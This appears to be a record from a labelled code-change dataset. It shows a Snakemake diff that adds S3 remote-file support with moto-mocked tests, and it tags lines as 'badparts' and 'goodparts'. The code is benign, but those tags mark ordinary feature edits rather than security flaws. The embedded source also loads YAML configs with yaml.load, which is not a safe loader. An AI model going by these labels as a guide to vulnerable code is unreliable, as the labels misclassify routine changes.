Persistence\n from snakemake.utils import update_config\n \ndiff --git a/tests/test_remote/S3Mocked.py b/tests/test_remote/S3Mocked.py\nnew file mode 100644\nindex 00000000..d8cc4895\n--- /dev/null\n+++ b/tests/test_remote/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a/tests/test_remote/Snakefile b/tests/test_remote/Snakefile\nnew file mode 100644\nindex 00000000..b2e1298c\n--- /dev/null\n+++ b/tests/test_remote/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket/out.txt ./\")\n+\n+rule split:\n+    input: remote('test-remote-bucket/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket/prefix')\n+        for f in os.listdir(os.getcwd()+\"/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket/\"+f, \"test-remote-bucket/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm ./motoState.p\")\n+\n+onerror:\n+    shell(\"rm ./motoState.p\")\n\\ No newline at end of file\ndiff --git a/tests/test_benchmark/expected-results/test.benchmark.json b/tests/test_remote/__init__.py\nsimilarity index 100%\nrename from tests/test_benchmark/expected-results/test.benchmark.json\nrename to tests/test_remote/__init__.py\ndiff --git a/tests/test_remote/expected-results/out.txt b/tests/test_remote/expected-results/out.txt\nnew file mode 100644\nindex 00000000..818b3c52\n--- /dev/null\n+++ b/tests/test_remote/expected-results/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/test_remote/test.txt b/tests/test_remote/test.txt\nnew file mode 100644\nindex 00000000..818b3c52\n--- /dev/null\n+++ b/tests/test_remote/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/tests.py b/tests/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd1801..6b53573a\n--- a/tests/tests.py\n+++ b/tests/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n", "files": {"/snakemake/dag.py": {"changes": [{"diff": "\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n", "add": 1, "remove": 1, "filename": "/snakemake/dag.py", "badparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"], "goodparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]}, "/snakemake/io.py": {"changes": [{"diff": "\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"], "goodparts": ["import functools", "from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException", "import snakemake.remote_providers.S3 as S3"]}, {"diff": "\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n", "add": 45, "remove": 3, "filename": "/snakemake/io.py", "badparts": ["    def protected(self):", "        return self.exists and not os.access(self.file, os.W_OK)", "        if not self.exists and lstat(self.file):"], "goodparts": ["    @_referToRemote", "    def exists_local(self):", "        return os.path.exists(self.file)", "    @property", "    def exists_remote(self):", "        return (self.is_remote and self.remote_object.exists())", "    def protected(self):", "        return self.exists_local and not os.access(self.file, os.W_OK)", "    @property", "    @_referToRemote", "        return lstat(self.file).st_mtime", "    @property", "    def flags(self):", "        return getattr(self._file, \"flags\", {})", "    @property", "    def mtime_local(self):", "    @_referToRemote", "    @property", "    def size_local(self):", "        self.check_broken_symlink()", "        return os.path.getsize(self.file)", "        if not self.exists_local and lstat(self.file):", "    def download_from_remote(self):", "        logger.info(\"Downloading from remote: {}\".format(self.file))", "        if self.is_remote and self.remote_object.exists():", "            self.remote_object.download()", "        else:", "            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")", "    def upload_to_remote(self):", "        logger.info(\"Uploading to remote: {}\".format(self.file))", "        if self.is_remote and not self.remote_object.exists():", "            self.remote_object.upload()", "        else:", "            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]}, {"diff": "\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["    def touch(self):", "            lutime(self.file, None)"], "goodparts": ["    def touch(self, times=None):", "        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"", "            lutime(self.file, times)"]}, {"diff": "\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n", "add": 12, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["        return IOFile(apply_wildcards(f, wildcards,", "                      rule=self.rule)"], "goodparts": ["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})", "        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,", "                                      rule=self.rule)", "        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))", "        return fileWithWildcardsApplied"]}, {"diff": "\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n", "add": 9, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["        return flag in value.flags"], "goodparts": ["        return flag in value.flags and value.flags[flag]", "    if isinstance(value, _IOFile):", "        return flag in value.flags and value.flags[flag]", "def get_flag_value(value, flag_type):", "    if isinstance(value, AnnotatedString):", "        if flag_type in value.flags:", "            return value.flags[flag_type]", "        else:", "            return None"]}, {"diff": "\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n", "add": 1, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["    annotated = flag(value, \"dynamic\")"], "goodparts": ["    annotated = flag(value, \"dynamic\", True)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, 